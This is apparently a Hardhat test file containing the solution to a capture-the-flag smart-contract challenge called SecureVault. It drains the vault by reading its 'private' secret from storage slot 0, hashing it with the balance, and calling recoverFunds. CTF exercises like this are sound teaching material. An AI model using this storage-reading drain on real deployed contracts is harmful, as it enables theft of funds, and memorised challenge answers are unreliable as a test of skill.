const { expect } = require("chai");
const hre = require("hardhat");
const ethers = hre.ethers;

const CHALLENGES = require("../challenge-addresses.js")
const challengeAddress = CHALLENGES.N1SecureVault;

// run the test
// npx hardhat test ./test/N1-SecureVault-easy.js
describe("CTF #1 SecureVault", function () {
  let challengeInstance, deployer;
  
  before(async function () {
    [deployer] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory("N1SecureVault");
    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') });
    await challengeInstance.deployed();
  });

  it("Should recover all funds", async function () {
    
    // Your code goes here

    // No variable is private on the contract, dont trust on private keyword...
    let secret = ethers.BigNumber.from(await ethers.provider.getStorageAt(challengeInstance.address, 0));

    let contractBalance = await ethers.provider.getBalance(challengeInstance.address);
    contractBalance = contractBalance.add(ethers.utils.parseEther("0.0001"));
    
    secret = ethers.utils.solidityKeccak256([ "uint256", "uint256" ], [ secret, contractBalance ]);
    
    await challengeInstance.recoverFunds(secret, { value: ethers.utils.parseEther("0.0001")});


    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal("0");
  });
});
